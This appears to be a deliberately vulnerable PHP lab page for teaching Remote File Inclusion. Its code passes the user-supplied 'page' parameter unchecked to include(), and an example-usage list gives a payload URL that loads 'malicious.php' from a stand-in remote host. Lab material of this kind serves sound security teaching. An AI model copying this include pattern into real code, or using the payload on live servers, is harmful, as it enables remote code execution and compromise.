<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RFI Vulnerable Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
        }
        nav {
            background-color: #f4f4f4;
            padding: 10px;
            margin-bottom: 20px;
        }
        nav a {
            margin-right: 10px;
            text-decoration: none;
            color: #333;
        }
        .warning {
            background-color: #ffcccc;
            border: 1px solid #ff0000;
            padding: 10px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <nav>
        <a href="index.php">Home</a>
        <a href="rfi_vulnerable.php">RFI Vulnerable Page</a>
        <a href="login.php">Login</a>
        <a href="admin/dashboard.php">Admin Dashboard</a>
    </nav>

    <div class="warning">
        <strong>Warning:</strong> This page is intentionally vulnerable to Remote File Inclusion (RFI) attacks. Use only for educational purposes in a controlled environment.
    </div>

    <h1>RFI Vulnerable Page</h1>

    <p>Enter a page to include:</p>
    <form method="GET">
        <input type="text" name="page" placeholder="Enter URL or file path">
        <input type="submit" value="Include">
    </form>

    <div>
        <?php
        // Внимание: Этот код намеренно уязвим! Только для образовательных целей.
        if (isset($_GET['page'])) {
            echo "<h2>Including: " . htmlspecialchars($_GET['page']) . "</h2>";
            include($_GET['page']);
        } else {
            echo "<p>No page specified. Use the form above to include a page.</p>";
        }
        ?>
    </div>

    <div>
        <h2>Example Usage:</h2>
        <ul>
            <li>Local file: <code>?page=welcome.php</code></li>
            <li>Remote file: <code>?page=http://remote-scripts.local:8080/malicious.php</code></li>
        </ul>
    </div>
</body>
</html>
